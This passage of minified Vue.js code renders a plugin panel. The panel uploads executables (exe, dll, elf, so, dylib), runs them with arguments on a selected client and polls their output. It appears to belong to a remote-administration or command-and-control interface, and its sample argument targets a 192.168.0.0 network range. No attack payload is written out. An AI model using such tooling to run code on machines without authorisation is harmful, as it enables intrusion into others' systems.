plugin",class:"full-width",onChange:Le},{default:m(()=>[(w(!0),M(ee,null,fe(R.value,u=>(w(),V(n,{key:u.name||u.Name,label:u.name||u.Name,value:u.name||u.Name},null,8,["label","value"]))),128))]),_:1},8,["modelValue","placeholder"]),c.value.selectedPlugin?(w(),V(s,{key:0,type:"danger",icon:Z(dt),onClick:Ie},{default:m(()=>[k(i(t.value?"删除插件":"Delete Plugin"),1)]),_:1},8,["icon"])):K("",!0)])]),_:1},8,["label"]),c.value.selectedPlugin?(w(),V(d,{key:0,label:t.value?"插件详情":"Plugin Details"},{default:m(()=>[o("div",It,[ie.value?(w(),M("div",Mt,i(t.value?"加载详情中...":"Loading plugin details..."),1)):L.value?(w(),M(ee,{key:1},[o("div",Dt,[o("span",Ft,i(t.value?"名称":"Name"),1),o("span",At,i(L.value.name||c.value.selectedPlugin),1)]),o("div",Rt,[o("span",zt,i(t.value?"类型":"Type"),1),o("span",Bt,i(L.value.type||L.value.Type||"-"),1)]),o("div",Ot,[o("span",Nt,i(t.value?"大小":"Size"),1),o("span",Vt,i(xe(L.value.size??L.value.Size??0)),1)]),o("div",Wt,[o("span",jt,i(t.value?"修改时间":"Modified"),1),o("span",Ht,i(L.value.last_modified||L.value.LastModified||"-"),1)]),o("div",Gt,[o("span",Kt,i(t.value?"描述":"Description"),1),o("span",Xt,i(L.value.description||L.value.Description||"-"),1)]),o("button",{class:"cs-btn cs-btn-xs",onClick:Te},i(t.value?"下载":"Download"),1)],64)):(w(),M("div",Yt,i(t.value?"未能获取插件详情":"Plugin details unavailable"),1))])]),_:1},8,["label"])):K("",!0),g(d,{label:t.value?"参数":"Arguments"},{default:m(()=>[g(y,{modelValue:c.value.arguments,"onUpdate:modelValue":e[12]||(e[12]=u=>c.value.arguments=u),placeholder:t.value?"请输入参数，例如：-h 192.168.0.0":"Enter arguments, e.g. -h 192.168.0.0",class:"full-width"},null,8,["modelValue","placeholder"])]),_:1},8,["label"]),o("div",qt,[o("div",Zt,[o("h4",Jt,"📜 "+i(t.value?"执行输出":"Execution Output"),1),o("div",Qt,[g(E,null,{default:m(()=>[g(s,{onClick:De,icon:"Delete",title:t.value?"清空输出":"Clear Output"},{default:m(()=>[k(i(t.value?"清空":"Clear"),1)]),_:1},8,["title"]),g(s,{onClick:Fe,icon:"CopyDocument",title:t.value?"复制全部":"Copy All"},{default:m(()=>[k(i(t.value?"复制":"Copy"),1)]),_:1},8,["title"]),g(s,{onClick:Ae,icon:"Download",title:t.value?"导出日志":"Export Log"},{default:m(()=>[k(i(t.value?"导出":"Export"),1)]),_:1},8,["title"]),g(s,{onClick:Re,icon:"Refresh",title:t.value?"手动刷新":"Manual Refresh",disabled:!c.value.clientUid},{default:m(()=>[k(i(t.value?"刷新":"Refresh"),1)]),_:1},8,["title","disabled"])]),_:1}),o("button",{class:"cs-btn cs-btn-primary",onClick:ze,disabled:!c.value.clientUid||!c.value.selectedPlugin||!C.value||Z(P)!==null},[Z(P)?(w(),M("span",tl,i(t.value?"执行中...":"Executing..."),1)):(w(),M("span",ll,i(t.value?"执行":"Execute")+" ("+i(F())+")",1))],8,el),Z(P)?(w(),M("button",{key:0,class:"cs-btn cs-btn-danger",onClick:Me},i(t.value?"停止轮询":"Stop Polling"),1)):K("",!0)])]),o("div",nl,[tt(o("textarea",{ref_key:"outputTextarea",ref:le,"onUpdate:modelValue":e[13]||(e[13]=u=>b.value=u),placeholder:"output",class:"output-textarea",readonly:"",style:lt(te.value?{height:Y.value+"px",width:q.value+"px"}:{})},null,4),[[nt,b.value]]),o("div",{class:"resize-handle-corner",onMousedown:ke},null,32),o("div",{class:"resize-handle-right",onMousedown:Pe},null,32),o("div",{class:"resize-handle-bottom",onMousedown:Se},null,32)])])]),_:1},8,["model"])]),g(T,{modelValue:ne.value,"onUpdate:modelValue":e[14]||(e[14]=u=>ne.value=u),title:t.value?"上传插件":"Upload Plugin",width:"700px","close-on-click-modal":!1},{footer:m(()=>[o("div",xl,[g(s,{onClick:He},{default:m(()=>[k(i(t.value?"关闭":"Close"),1)]),_:1}),g(s,{type:"primary",onClick:Ne},{default:m(()=>[k(i(t.value?"开始上传":"Start Upload"),1)]),_:1})])]),default:m(()=>[o("div",al,[o("div",sl,[g(p,{class:"info-icon"},{default:m(()=>[g(Z(mt))]),_:1}),k(" "+i(t.value?"支持exe,net,elf,dll,so,dylib格式，单个文件不超过50MB，最多只能同时上传6个文件":"Supports exe, net, elf, dll, so, dylib. Max 50MB per file, up to 6 files at once.")+" ",1),g(s,{type:"primary",class:"select-file-btn",onClick:je},{default:m(()=>[k(i(t.value?"选择文件":"Select Files"),1)]),_:1})]),o("div",ol,[o("div",il,[o("div",ul,i(t.value?"缩略图":"Preview"),1),o("div",rl,i(t.value?"文件名":"File Name"),1),o("div",cl,i(t.value?"文件大小":"Size"),1),o("div",dl,i(t.value?"状态":"Status"),1),o("div",pl,i(t.value?"操作":"Actions"),1)]),o("div",vl,[j.value.length===0?(w(),M("div",fl,i(t.value?"暂无文件":"No files"),1)):K("",!0),(w(!0),M(ee,null,fe(j.value,(u,_)=>(w(),M("div",{key:_,class:"file-item"},[hl,o("div",ml,i(u.name),1),o("div",gl,i(xe(u.size)),1),o("div",yl,i(t.value?"待上传":"Pending"),1),o("div",_l,[g(s,{type:"text",onClick:I=>We(_)},{default:m(()=>[k(i(t.value?"删除":"Remove"),1)]),_:2},1032,["onClick"])])]))),128))])]),o("input",{ref_key:"fileInput",ref:he,type:"file",multiple:"",accept:".exe,.net,.elf,.dll,.so,.dylib",style:{display:"none"},onChange:Ve},null,544)])]),_:1},8,["modelValue","title"])],64)):(w(),V(Z(x),{key:1}))])}}}),Tl=qe(bl,[["__scopeId","data-v-d1407e4d"]]);export{Tl as default};
